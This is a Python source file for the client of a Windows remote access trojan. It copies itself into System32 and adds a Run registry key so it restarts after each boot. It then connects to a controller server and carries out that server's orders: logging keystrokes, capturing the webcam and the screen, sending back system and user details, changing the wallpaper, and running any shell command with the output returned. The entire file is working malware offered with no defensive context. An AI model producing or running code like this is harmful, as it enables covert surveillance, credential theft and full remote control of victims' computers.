import socket
import pickle
import pyautogui
import cv2
from PIL import Image
from pynput import keyboard
import time
import threading
import platform
import os
import psutil
import ctypes
import subprocess
import shutil
import winreg as reg  

IP = '127.0.0.1'
PORT = 8888

current_pressed = []

def recvall(n):
    data = bytearray()
    while len(data) < n:
        packet = client_socket.recv(n - len(data))
        if not packet:
            return None
        data.extend(packet)
    return data

def send(send_data):
    data = pickle.dumps(send_data)
    length = len(data)
    client_socket.sendall(length.to_bytes(4, byteorder="little"))
    client_socket.sendall(data)

def recv():
    data = client_socket.recv(4)	
    length = int.from_bytes(data, "little")
    buf = recvall(length)
    recv_data = pickle.loads(buf)
    return recv_data

def on_press(key):
    current_pressed.append(f'{time.localtime().tm_year}-{time.localtime().tm_mon}-{time.localtime().tm_mday} {time.localtime().tm_hour}:{time.localtime().tm_min}:{time.localtime().tm_sec}  {key}')

if __name__ == '__main__':
    shutil.copyfile("client.exe", "C:\Windows\System32\client.exe")
    key = reg.HKEY_LOCAL_MACHINE
    key_value = "SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
    open = reg.OpenKey(key,key_value,0,reg.KEY_ALL_ACCESS)
    client = reg.SetValueEx(open, "client", 0, reg.REG_SZ, '"C:\Windows\System32\client.exe"')
    reg.CloseKey(open) 
    while True:
        try:
            client_socket=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            print('[+] Client Socket Create')

            client_socket.connect((IP, PORT))
            print('[+] Server Connection!')
        except Exception as e:
            print('[-] Error : {}'.format(e))

        keyboard_listener = keyboard.Listener(on_press=on_press)
        keyboard_listener.daemon = True
        keyboard_listener.start()

        while True:
            try:
                command = recv()
                print('[*] Recv Data {}'.format(command))

                if command == 'camera_capture':
                    video_capture = cv2.VideoCapture(0, cv2.CAP_DSHOW)
                    ret, frame = video_capture.read()
                    video_capture.release()
                    frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
                    img = Image.fromarray(frame)
                    send(img)
                    print('[*] Secv Data camera_capture')

                if command == 'screen_capture':
                    image = pyautogui.screenshot()
                    send(image)
                    print('[*] Secv Data screen_capture')
                
                if command == 'keylog_listening':
                    send(current_pressed)
                    print('[*] Secv Data keylog_listening')
                
                if command == 'keylog_save':
                    send(current_pressed)
                    current_pressed.clear()
                    print('[*] Secv Data keylog_save')

                if command == 'computer_information':
                    send((platform.system(), platform.version(), platform.processor(), os.cpu_count(), platform.machine(), str(round(psutil.virtual_memory().total / (1024.0 **3)))+'(GB)', socket.gethostname(), os.getenv('USERNAME')))
                    print('[*] Secv Data keylog_save')

                if command[0] == 'change_wallpaper':
                    command[1].save('C:\Windows\System32\\1750670.jpg')
                    ctypes.windll.user32.SystemParametersInfoW(20, 0, "C:\Windows\System32\\1750670.jpg" , 3)
                    send('success!')
                    print('[*] Secv Data change_wallpaper')
                
                if command[0] == 'command':
                    proc = subprocess.Popen(command[1], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                    stdout_value = proc.stdout.read() + proc.stderr.read()
                    send(stdout_value.decode('utf-8', 'ignore'))
                    
                if command == 'connected?':
                    send('success!')
                    print('[*] Secv Data success!')

            except WindowsError as e:
                print('[-] Disconnect!')
                client_socket.close()
                break